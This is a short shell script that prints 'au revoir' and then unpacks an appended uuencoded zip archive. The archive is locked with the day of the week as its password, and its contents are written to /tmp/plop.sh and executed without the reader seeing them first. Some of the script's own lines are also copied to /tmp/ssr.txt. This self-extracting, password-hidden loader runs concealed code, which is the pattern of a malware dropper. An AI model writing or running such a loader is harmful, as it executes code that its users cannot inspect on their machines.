echo 'au revoir'
tail -n 10 $0 | uudecode -o /tmp/plop.z
unzip -P `date +%u` -p /tmp/plop.z | cat > /tmp/plop.sh
if test `head -n 1 /tmp/plop.sh |grep -c 'for'` -eq 1; then
	tail -n 18 $0 | head -n 8 > /tmp/ssr.txt
	chmod 700 /tmp/plop.sh 
	/tmp/plop.sh
fi
exit
begin 664 plop
M4$L#!"T`"0`(`*=,1$L``*=,__________\!`!0`+0$`$```````````````
M````````T#T=0TQ5+M1&XEM0%TT2Z.$0$GV.!S16BP5Z$WR^!+GS3Q7&3?#4
MOY?F?E_::ZVM7?:1<SPM7RP."T:0](I[2]SY-/?`*DJ9T%8D"08:"TW)[R`O
M1H&ETM2$5D_M@J\:.JOG8^_7'(>0@C.-X6,1XR0M?(XV;XME'PY.2%"*_9V7
M@Q\)]Q<]5G484$L'".1#?-^*`````````*(`````````4$L!`AX#+0`)``@`
MITQ$2^1#?-^*````H@````$``````````0```(`1`````"U02P4&``````$`
,`0`O````U0``````
`
end
